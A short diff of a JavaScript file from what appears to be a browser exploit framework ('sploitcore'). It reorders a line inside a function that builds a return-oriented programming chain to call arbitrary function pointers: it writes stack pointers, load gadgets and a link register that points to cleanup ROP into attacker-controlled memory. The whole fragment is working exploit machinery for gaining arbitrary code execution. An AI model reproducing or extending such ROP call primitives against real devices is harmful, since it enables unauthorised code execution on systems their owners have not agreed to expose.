@@ -545,7 +545,6 @@ sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
 
     this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
     this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
-    this.write8(funcptr, loadarea, 0x80 >> 2); 
 
     sp = add2(sp, -0x80);
 
@@ -576,6 +575,7 @@ sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
         }
     }
 
+    this.write8(funcptr, loadarea, 0x80 >> 2); // Set the code to call to our function pointer.
     this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop
 
     // Stack arguments would be bottomed-out at sp + 0xE0...
